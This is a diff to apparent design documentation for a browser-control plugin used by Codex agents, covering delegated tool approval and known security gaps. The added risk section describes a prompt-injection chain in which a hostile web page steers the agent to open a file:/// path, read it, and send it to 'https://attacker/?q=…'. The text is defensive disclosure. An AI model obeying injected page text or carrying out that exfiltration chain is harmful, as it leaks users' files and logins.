@@ -76,8 +76,9 @@ no tab or more than one tab may be visible (see the known gaps).
 `window_input` and `page_open` reach the open web, so their annotations
 truthfully say `openWorldHint: true`. They also declare `"approval":
 "delegated"` (manifest version 7): enabling the plugin is the owner's grant,
-and the kernel then lets Codex run them without asking, in threads that start
-after the enable (#2530 E3c, `docs/plugin-security.md`). Disabling the plugin
+and the kernel then lets Codex Planner and Worker threads run them without
+asking, in threads that start after the refresh that follows the enable (about
+a second; #2530 E3c, `docs/plugin-security.md`). Disabling the plugin
 withdraws the grant. The three views are read-only and never asked.
 
 ## Install Chrome (no apt packages)
@@ -213,11 +214,17 @@ Record the result in the PR.
   Workers. Narrowing to bound Tracks is one manifest field
   (`agent_tools_scope: "bound-track"`).
 - **Approval is delegated.** `page_open` and `window_input` run without a
-  prompt in Codex threads that start after the owner enables the plugin, also
-  under the Planner's asking tier, so page text that steers a model can drive
-  them (prompt injection). The kernel promises the grant only to threads that
-  start after the enable; Codex 0.159.2 also applies it to loaded threads at
-  the kernel's reload. Disabling the plugin is the off switch.
+  prompt in Codex Planner and Worker threads that start after the refresh
+  following the owner's enable, also under the Planner's asking tier, so page
+  text that steers a model can drive them (prompt injection). Codex 0.159.2
+  also applies the grant to loaded threads at the kernel's reload. Disabling
+  the plugin is the off switch.
+- **A steered agent can read a local file and send it out, unasked.** With
+  delegation, nothing stops this chain: an injected page makes the agent type
+  `file:///…` with `window_input`, read it with `page_cat`, and send it with
+  `page_open https://attacker/?q=…`. Before delegation each step was a prompt.
+  Enable the plugin only if you accept this; the Chrome profile, the browser's
+  logins and the user's files are within its reach.
 - **`page_open` takes web URLs only, but that is no boundary.** It refuses
   `file:`, `chrome:` and other schemes, yet `window_input` can type any
   address into Chrome's address bar, `file:///` included, and `page_cat` then
@@ -235,9 +242,9 @@ Record the result in the PR.
   60 seconds after a login before any stop.
 - **The last session comes back.** On the next launch, after an orderly stop
   or a SIGKILL, Chrome usually restores the last session (a SIGKILL right
-  after a change can bring back the session from before it): its windows and tabs
-  reopen and their pages load again, which repeats whatever a page's GET does
-  (`--hide-crash-restore-bubble` only hides the "Restore pages?" bubble). A
+  after a change can bring back the session from before it): its windows and
+  tabs reopen and their pages load again, which repeats whatever a page's GET
+  does (`--hide-crash-restore-bubble` only hides the "Restore pages?" bubble). A
   session left with a popup open comes back with two windows, and `page_*`
   refuse with `-32409` until one is closed.
 - **Window churn ends sessions.** A new window of the app, or closing the
